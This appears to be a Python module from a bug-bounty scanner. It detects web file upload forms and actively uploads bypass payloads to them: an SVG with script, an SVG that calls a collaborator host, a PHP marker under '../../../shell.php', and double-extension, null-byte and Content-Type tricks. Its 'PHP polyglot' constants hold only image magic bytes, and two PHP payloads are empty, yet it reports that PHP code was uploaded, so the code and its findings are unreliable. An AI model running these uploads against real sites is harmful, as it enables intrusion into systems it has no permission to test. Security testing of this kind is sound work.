# detectors/file_upload_detector.py
"""
File Upload Bypass Detector - RCE and XSS vulnerabilities

Tests for:
- Magic byte manipulation (JPEG header + PHP code)
- Double extension bypass (shell.php.jpg, shell.jpg.php)
- MIME type bypass
- Path traversal in filename (../../shell.php)
- SVG with embedded XSS/SSRF
- Polyglot files (valid image + executable code)
- Null byte injection (shell.php%00.jpg)
- Content-Type manipulation
- File upload forms detection

Expected Bounty Value: $500-$10,000 per finding (Can lead to RCE!)
Common in: User profile uploads, document processing, image galleries
"""
import aiohttp
import logging
import re
from urllib.parse import urlparse
from detectors.registry import register_passive, register_active, await_host_token

logger = logging.getLogger(__name__)

# SVG with XSS payload
SVG_XSS = """<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
<circle cx="50" cy="50" r="40" />
</svg>"""

# SVG with SSRF payload (reads from Interactsh collaborator)
SVG_SSRF_TEMPLATE = """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="%COLLAB%/svg-ssrf"/>
</svg>"""

# Polyglot JPEG+PHP (valid image + PHP code)
# JPEG magic bytes: FF D8 FF E0
POLYGLOT_JPEG_PHP = b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'

# GIF+PHP polyglot
# GIF magic bytes: GIF89a
POLYGLOT_GIF_PHP = b'GIF89a'

# File upload form patterns
FILE_UPLOAD_PATTERNS = [
    r'<input[^>]+type=["\']?file["\']?',
    r'<form[^>]*enctype=["\']?multipart/form-data["\']?',
    r'dropzone',
    r'file-upload',
    r'upload-button',
    r'browse-file',
]

# Dangerous file extensions
DANGEROUS_EXTENSIONS = [
    # Web shells
    ".php", ".php3", ".php4", ".php5", ".phtml", ".phar",
    ".asp", ".aspx", ".asax", ".ascx", ".ashx",
    ".jsp", ".jspx", ".jsw", ".jsv", ".jspf",
    ".cgi", ".pl",

    # Executables
    ".exe", ".dll", ".sh", ".bat", ".cmd",

    # Server configs
    ".htaccess", ".htpasswd", ".config",

    # Dangerous image formats
    ".svg", ".swf",
]

# Bypass techniques for extensions
EXTENSION_BYPASSES = [
    # Double extensions
    "{ext}.jpg",
    "jpg.{ext}",
    "{ext}.png",
    "png.{ext}",

    # Case variation
    "{EXT}",
    "{Ext}",

    # Null byte injection
    "{ext}%00.jpg",
    "{ext}\x00.jpg",

    # Alternate extensions
    "{ext}.",
    ".{ext}",
    "{ext}%20",
    "{ext}::$DATA",  # Windows NTFS ADS
]


@register_passive
def file_upload_detector_passive(text, combined_dict):
    """
    Passive detection of file upload functionality.
    """
    findings = []

    try:
        url = combined_dict["url"]
        context = combined_dict["context"]

        body = context.get("body", text)

        if not body:
            return findings

        # Check for file upload forms
        for pattern in FILE_UPLOAD_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                findings.append({
                    "type": "File Upload Form Detected",
                    "severity": "info",
                    "evidence": f"File upload form found via pattern: {pattern}",
                    "how_found": f"HTML contains file upload pattern: {pattern}",
                    "evidence_url": url,
                    "impact": "File upload functionality detected. May be vulnerable to bypass attacks.",
                    "remediation": "Test file upload with various bypass techniques (magic bytes, double extensions, etc.)",
                })

                logger.info(f"📁 File upload form detected on {url}")
                break  # One finding is enough

    except Exception as e:
        logger.exception(f"file_upload_detector_passive error for {url}: {e}")

    return findings


@register_active
async def file_upload_detector_active(session, url, context):
    """
    Active file upload bypass testing.

    Only runs if --allow-destructive flag is set.
    Tests various bypass techniques on detected upload forms.
    """
    findings = []

    allow_destructive = context.get("allow_destructive", False)
    if not allow_destructive:
        return findings

    try:
        body = context.get("body", "")
        per_host_rate = context.get("per_host_rate", None)

        if not body:
            return findings

        parsed = urlparse(url)
        host = parsed.netloc.lower()

        # Check if this page has file upload form
        has_upload_form = any(re.search(pattern, body, re.IGNORECASE) for pattern in FILE_UPLOAD_PATTERNS)

        if not has_upload_form:
            return findings

        logger.info(f"🔍 Testing file upload bypasses on {url}")

        # Extract form action URL
        form_action = url  # Default to current URL
        action_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', body, re.IGNORECASE)
        if action_match:
            action = action_match.group(1)
            if action.startswith('http'):
                form_action = action
            elif action.startswith('/'):
                form_action = f"{parsed.scheme}://{parsed.netloc}{action}"
            else:
                form_action = f"{parsed.scheme}://{parsed.netloc}/{action}"

        # Test 1: SVG with XSS
        logger.info(f"🔍 Testing SVG XSS upload")
        await await_host_token(host, per_host_rate)

        try:
            svg_data = aiohttp.FormData()
            svg_data.add_field('file',
                               SVG_XSS.encode(),
                               filename='test.svg',
                               content_type='image/svg+xml')

            async with session.post(form_action, data=svg_data, timeout=15) as resp:
                status = resp.status
                body = await resp.text()

                # Check if upload succeeded
                if status in [200, 201] and ('success' in body.lower() or 'upload' in body.lower()):
                    # Try to find uploaded file URL
                    url_match = re.search(r'(https?://[^\s<>"]+\.svg)', body)
                    uploaded_url = url_match.group(1) if url_match else "Unknown"

                    findings.append({
                        "type": "File Upload SVG XSS",
                        "severity": "high",
                        "evidence": f"SVG file with XSS payload uploaded successfully",
                        "how_found": "Uploaded SVG file with onload=alert() payload",
                        "evidence_url": form_action,
                        "evidence_status": status,
                        "uploaded_file_url": uploaded_url,
                        "payload": SVG_XSS[:100] + "...",
                        "impact": "SVG files can contain JavaScript. If served without proper Content-Type, leads to stored XSS.",
                        "remediation": "Sanitize SVG uploads, serve with Content-Disposition: attachment, or block SVG uploads",
                        "cve_reference": "CWE-79: Cross-site Scripting (XSS)",
                    })

                    logger.warning(f"🔥 HIGH: SVG XSS upload successful on {form_action}")

        except Exception as e:
            logger.debug(f"SVG XSS test failed: {e}")

        # Test 2: PHP file with double extension
        logger.info(f"🔍 Testing double extension bypass")
        await await_host_token(host, per_host_rate)

        try:
            php_code = b''

            # Test multiple double extensions
            test_filenames = [
                'shell.php.jpg',
                'shell.jpg.php',
                'shell.php.png',
                'shell.php5',
                'shell.phtml',
            ]

            for filename in test_filenames[:2]:  # Test first 2 for speed
                await await_host_token(host, per_host_rate)

                upload_data = aiohttp.FormData()
                upload_data.add_field('file',
                                      php_code,
                                      filename=filename,
                                      content_type='image/jpeg')

                async with session.post(form_action, data=upload_data, timeout=15) as resp:
                    status = resp.status
                    body = await resp.text()

                    if status in [200, 201]:
                        findings.append({
                            "type": "File Upload Double Extension",
                            "severity": "critical",
                            "evidence": f"Uploaded file with double extension: {filename}",
                            "how_found": f"Successfully uploaded file: {filename} with PHP code",
                            "evidence_url": form_action,
                            "evidence_status": status,
                            "filename": filename,
                            "impact": "CRITICAL: Double extension bypass can lead to RCE if server executes PHP code",
                            "remediation": "Validate file extensions on server-side, use whitelist, check magic bytes",
                            "cve_reference": "CWE-434: Unrestricted Upload of File with Dangerous Type",
                        })

                        logger.warning(f"🔥 CRITICAL: Double extension upload successful: {filename}")
                        break

        except Exception as e:
            logger.debug(f"Double extension test failed: {e}")

        # Test 3: Polyglot file (JPEG+PHP)
        logger.info(f"🔍 Testing polyglot file upload")
        await await_host_token(host, per_host_rate)

        try:
            upload_data = aiohttp.FormData()
            upload_data.add_field('file',
                                  POLYGLOT_JPEG_PHP,
                                  filename='image.jpg',
                                  content_type='image/jpeg')

            async with session.post(form_action, data=upload_data, timeout=15) as resp:
                status = resp.status
                body = await resp.text()

                if status in [200, 201]:
                    findings.append({
                        "type": "File Upload Polyglot File",
                        "severity": "high",
                        "evidence": "Uploaded polyglot file (valid JPEG + PHP code)",
                        "how_found": "Uploaded file with JPEG magic bytes + embedded PHP code",
                        "evidence_url": form_action,
                        "evidence_status": status,
                        "filename": "image.jpg",
                        "impact": "Polyglot files pass magic byte validation but contain executable code. Can lead to RCE.",
                        "remediation": "Re-encode images server-side, strip metadata, validate entire file content",
                        "cve_reference": "CWE-434: Unrestricted Upload of File with Dangerous Type",
                    })

                    logger.warning(f"🔥 HIGH: Polyglot file upload successful")

        except Exception as e:
            logger.debug(f"Polyglot test failed: {e}")

        # Test 4: Path traversal in filename
        logger.info(f"🔍 Testing path traversal in filename")
        await await_host_token(host, per_host_rate)

        try:
            traversal_filenames = [
                '../../../shell.php',
                '..\\..\\..\\shell.php',
                'test.jpg/../../../shell.php',
            ]

            for filename in traversal_filenames[:1]:  # Test first one
                await await_host_token(host, per_host_rate)

                upload_data = aiohttp.FormData()
                upload_data.add_field('file',
                                      b'<?php echo "RCE"; ?>',
                                      filename=filename,
                                      content_type='image/jpeg')

                async with session.post(form_action, data=upload_data, timeout=15) as resp:
                    status = resp.status
                    body = await resp.text()

                    if status in [200, 201]:
                        findings.append({
                            "type": "File Upload Path Traversal",
                            "severity": "critical",
                            "evidence": f"Uploaded file with path traversal in filename: {filename}",
                            "how_found": f"Server accepted filename with traversal: {filename}",
                            "evidence_url": form_action,
                            "evidence_status": status,
                            "filename": filename,
                            "impact": "CRITICAL: Path traversal allows writing files to arbitrary directories, can lead to RCE",
                            "remediation": "Sanitize filenames, remove path separators, use basename()",
                            "cve_reference": "CWE-22: Path Traversal",
                        })

                        logger.warning(f"🔥 CRITICAL: Path traversal in filename accepted!")
                        break

        except Exception as e:
            logger.debug(f"Path traversal test failed: {e}")

        # Test 5: Content-Type bypass
        logger.info(f"🔍 Testing Content-Type bypass")
        await await_host_token(host, per_host_rate)

        try:
            # Upload PHP file but with image Content-Type
            upload_data = aiohttp.FormData()
            upload_data.add_field('file',
                                  b'',
                                  filename='shell.php',
                                  content_type='image/jpeg')  # Lie about content type

            async with session.post(form_action, data=upload_data, timeout=15) as resp:
                status = resp.status
                body = await resp.text()

                if status in [200, 201] and 'shell.php' in body:
                    findings.append({
                        "type": "File Upload Content-Type Bypass",
                        "severity": "critical",
                        "evidence": "Uploaded .php file by manipulating Content-Type header",
                        "how_found": "Uploaded shell.php with Content-Type: image/jpeg",
                        "evidence_url": form_action,
                        "evidence_status": status,
                        "impact": "CRITICAL: Server trusts client-provided Content-Type. Can upload any file type.",
                        "remediation": "Validate file content (magic bytes), don't trust Content-Type header",
                        "cve_reference": "CWE-434: Unrestricted Upload of File with Dangerous Type",
                    })

                    logger.warning(f"🔥 CRITICAL: Content-Type bypass successful!")

        except Exception as e:
            logger.debug(f"Content-Type bypass test failed: {e}")

    except Exception as e:
        logger.exception(f"file_upload_detector_active error for {url}: {e}")

    return findings
